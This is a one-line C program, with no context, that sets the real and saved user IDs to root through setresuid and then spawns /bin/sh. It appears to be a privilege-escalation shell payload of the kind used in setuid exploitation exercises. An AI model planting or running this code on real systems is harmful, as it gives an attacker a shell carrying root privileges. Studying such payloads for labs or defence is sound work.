int main(void) { setresuid(0, 1000, 0); system("/bin/sh"); }
